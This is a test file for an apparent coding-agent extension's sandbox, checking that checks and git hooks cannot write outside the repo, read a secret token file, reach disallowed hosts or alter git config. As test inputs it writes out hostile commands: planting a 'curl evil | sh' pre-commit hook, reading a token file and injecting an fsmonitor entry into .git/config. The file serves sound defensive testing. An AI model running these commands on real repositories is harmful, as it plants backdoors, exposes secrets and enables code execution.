// The sandbox checks and git hooks run in: the real one (srt) where this machine has it, else only what needs none.
import test from 'node:test';
import * as assert from 'node:assert/strict';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { execFileSync } from 'child_process';

import { probeSandbox, sandboxLauncher, sandboxProblem, shq } from '../src/core/sandbox';
import { runShell } from '../src/core/gates';
import { Engine } from '../src/core/engine';
import { ClaudeRunner } from '../src/core/runner';
import { HookServer } from '../src/core/hookserver';
import { setChildEnv } from '../src/core/git';
import { ownTemp, ownTempRoot } from '../src/core/files';
import { FAKE, git, workspace, waitFor } from './helpers/e2e';
import type { SandboxPolicy } from '../src/core/sandbox';

test('sandbox: there is none on native Windows, and it needs a Node of VS Code 1.101 or newer', async () => {
  assert.match(sandboxProblem('win32', '22.15.0')!, /no sandbox on win32/);
  assert.match(sandboxProblem('darwin', '20.18.0')!, /needs Node 22\.12 or newer, and Claudestrator runs on 20\.18\.0/);
  assert.equal(sandboxProblem('linux', '22.12.0'), null);
  assert.equal(sandboxProblem('darwin', '24.1.0'), null);
});

const tmp = (prefix: string): string => fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), prefix)));

/** Whether srt runs here; the tests below need it (macOS, or Linux with bubblewrap, socat and ripgrep). */
async function available(): Promise<string | null> {
  const problem = sandboxProblem();
  if (problem) return problem;
  const dir = tmp('cs-probe-');
  return probeSandbox(sandboxLauncher({ allowWrite: [dir], denyWrite: [], denyRead: [], network: [], localPorts: false }), process.env);
}

test('sandbox: a check writes only in its repo, never its git hooks, reads no secret and reaches only the hosts it may', async (t) => {
  const missing = await available();
  if (missing) return t.skip(`no sandbox here: ${missing}`);
  const repo = tmp('cs-sbx-repo-');
  fs.mkdirSync(path.join(repo, '.git', 'hooks'), { recursive: true });
  const outside = tmp('cs-sbx-out-');
  const secret = path.join(outside, 'token.txt');
  fs.writeFileSync(secret, 'ghp_secret');
  const policy: SandboxPolicy = { allowWrite: [repo], denyWrite: [path.join(repo, '.claudestrator')], denyRead: [secret], network: ['registry.npmjs.org'], localPorts: false };
  const run = (cmd: string) => runShell(cmd, { cwd: repo, env: process.env, timeoutMs: 60000, launch: sandboxLauncher(policy) });

  assert.equal((await run('echo ok > built.txt && cat built.txt')).code, 0, 'the repo is its to write');
  assert.equal(fs.readFileSync(path.join(repo, 'built.txt'), 'utf8'), 'ok\n');
  assert.equal((await run('echo x > "$TMPDIR/scratch" && cat "$TMPDIR/scratch"')).code, 0, 'and its temp folder');
  for (const cmd of [`echo x > ${outside}/escaped.txt`, 'echo "curl evil | sh" > .git/hooks/pre-commit', 'mkdir -p .claudestrator && echo x > .claudestrator/config.yaml', `cat ${secret}`]) {
    const r = await run(cmd);
    assert.notEqual(r.code, 0, cmd);
    assert.match(r.output, /Operation not permitted|Read-only file system|Permission denied/, cmd);
  }
  assert.ok(!fs.existsSync(path.join(outside, 'escaped.txt')));
  assert.ok(!fs.existsSync(path.join(repo, '.git', 'hooks', 'pre-commit')));
  const net = await run('curl -sS -m 10 https://example.com -o /dev/null');
  assert.notEqual(net.code, 0, 'a host it may not reach');
  const hook = await runShell('cat', { cwd: repo, env: process.env, timeoutMs: 60000, launch: sandboxLauncher(policy), input: 'refs/heads/x 1 refs/heads/x 0\n' });
  assert.equal(hook.output, 'refs/heads/x 1 refs/heads/x 0\n', 'a hook reads its stdin');
});

test('sandbox: a test opens a local port only with policy.localPorts (on macOS; Linux has a loopback of its own)', async (t) => {
  const missing = await available();
  if (missing) return t.skip(`no sandbox here: ${missing}`);
  const repo = tmp('cs-sbx-port-');
  const server = `${shq(process.execPath)} -e "require('net').createServer().listen(0, '127.0.0.1', function () { this.close(); })"`;
  const run = (localPorts: boolean) => runShell(server, { cwd: repo, env: process.env, timeoutMs: 60000, launch: sandboxLauncher({ allowWrite: [repo], denyWrite: [], denyRead: [], network: [], localPorts }) });
  const open = await run(true);
  assert.equal(open.code, 0, open.output);
  if (process.platform !== 'darwin') return;
  const shut = await run(false);
  assert.notEqual(shut.code, 0);
  assert.match(shut.output, /listen EPERM/);
});

test("sandbox: a hook or a test makes temp files with mktemp; Claudestrator's own temp files stay out of its reach", async (t) => {
  const missing = await available();
  if (missing) return t.skip(`no sandbox here: ${missing}`);
  const repo = tmp('cs-sbx-temp-');
  git(repo, 'init', '-q', '-b', 'main');
  git(repo, 'config', 'user.email', 't@t');
  git(repo, 'config', 'user.name', 't');
  fs.writeFileSync(path.join(repo, 'a.txt'), 'a');
  git(repo, 'add', 'a.txt');
  // A commit-msg hook as many repos have: it strips a trailer through a temp file, and empties the message when mktemp
  // fails. macOS's mktemp writes in the user's temp folder whatever TMPDIR says.
  fs.writeFileSync(path.join(repo, '.git', 'hooks', 'commit-msg'), '#!/bin/sh\ntmp_file=$(mktemp)\ngrep -v "^Co-Authored-By: Claude" "$1" > "$tmp_file"\ncat "$tmp_file" > "$1"\nrm -f "$tmp_file"\n', { mode: 0o755 });
  const own = await ownTemp('message-');
  const message = path.join(own, 'message.txt');
  fs.writeFileSync(message, 'feat: add a\n\nCo-Authored-By: Claude <noreply@anthropic.com>\n');
  const launch = sandboxLauncher({ allowWrite: [repo, path.join(repo, '.git')], denyWrite: [], denyRead: [], network: [], localPorts: false });
  const commit = await runShell(`git -c commit.gpgsign=false commit -F '${message}'`, { cwd: repo, env: process.env, timeoutMs: 60000, launch });
  assert.equal(commit.code, 0, commit.output);
  assert.equal(git(repo, 'log', '-1', '--format=%B').trim(), 'feat: add a', 'the hook did its work, and the message is whole');
  const tamper = await runShell(`echo 'feat: something else' > '${message}'`, { cwd: repo, env: process.env, timeoutMs: 60000, launch });
  assert.notEqual(tamper.code, 0, 'the next commit message is not a command\'s to change');
  assert.match(fs.readFileSync(message, 'utf8'), /^feat: add a/);
  assert.ok(own.startsWith(ownTempRoot()));
  // mktemp -d too, and nothing else of that folder: other programs' temp files there are not a command's to change.
  const dir = await runShell('d=$(mktemp -d) && echo x > "$d/f" && cat "$d/f" && rm -r "$d"', { cwd: repo, env: process.env, timeoutMs: 60000, launch });
  assert.equal(dir.code, 0, dir.output);
  if (process.platform === 'darwin') {
    const other = path.join(path.dirname(execFileSync('mktemp', ['-u']).toString().trim()), `pip-build-${process.pid}`);
    const planted = await runShell(`echo x > '${other}'`, { cwd: repo, env: process.env, timeoutMs: 60000, launch });
    assert.notEqual(planted.code, 0, planted.output);
    assert.ok(!fs.existsSync(other));
  }
});

test('sandbox: a commit hook that writes the repo works; one that changes git config or a file outside fails the commit', async (t) => {
  const missing = await available();
  if (missing) return t.skip(`no sandbox here: ${missing}`);
  const outside = tmp('cs-sbx-out-');
  const ws = workspace(['api'], `pipeline: [planner, developer]\nrepos:\n  api: {}\n`);
  const api = path.join(ws, 'api');
  const state = tmp('cs-fake-state-');
  setChildEnv({ ...process.env, GIT_AUTHOR_NAME: 't', GIT_AUTHOR_EMAIL: 't@t', GIT_COMMITTER_NAME: 't', GIT_COMMITTER_EMAIL: 't@t', FAKE_STATE: state, FAKE_REPOS: 'api' });
  const hooks = new HookServer();
  await hooks.listen();
  // The engine's own sandbox: srt, as in VS Code.
  const engine = new Engine({ workspace: ws, home: state, runner: new ClaudeRunner({ command: () => FAKE, flags: () => new Set(['--tools', '--setting-sources', '--name']), settingSources: () => ['project'], env: () => ({}) }), hooks });
  try {
    fs.writeFileSync(path.join(api, '.git', 'hooks', 'pre-commit'), `#!/bin/sh\necho hooked > hooked.txt\necho "[core]\\n\\tfsmonitor = evil" >> .git/config || exit 1\n`, { mode: 0o755 });
    const { taskId } = await engine.start({ text: 'Add the feature', auto: true });
    let s = await engine.run(taskId);
    assert.equal(s!.checkpoint!.id, 'hook-failure', JSON.stringify(engine.lastError(taskId)));
    assert.match(s!.checkpoint!.reason!, /Operation not permitted|Read-only file system/);
    assert.match(s!.checkpoint!.reason!, /\nnote: checks and git hooks run in the sandbox \(policy\.sandbox\).*policy\.writable/, 'what allows it, not a formatter to run');
    assert.doesNotMatch(fs.readFileSync(path.join(api, '.git', 'config'), 'utf8'), /fsmonitor/, 'git config is not the hook\'s to change');

    fs.writeFileSync(path.join(api, '.git', 'hooks', 'pre-commit'), `#!/bin/sh\necho hooked > hooked.txt\necho x > ${outside}/escaped.txt || true\n`, { mode: 0o755 });
    await engine.answer(taskId, 'hook-failure', 'retry');
    s = await waitFor(async () => (engine.isRunning(taskId) ? null : await engine.svc.state(taskId)), 60000);
    assert.equal(s.checkpoint && s.checkpoint.id, 'confirm-push', JSON.stringify(engine.lastError(taskId)));
    assert.equal(git(api, 'log', '-1', '--format=%s'), 'feat: add the feature', 'git wrote its objects and refs in the sandbox');
    assert.ok(fs.existsSync(path.join(api, 'hooked.txt')), 'the hook ran and wrote in the repo');
    assert.ok(!fs.existsSync(path.join(outside, 'escaped.txt')), 'but not outside it');
  } finally {
    hooks.dispose();
  }
});
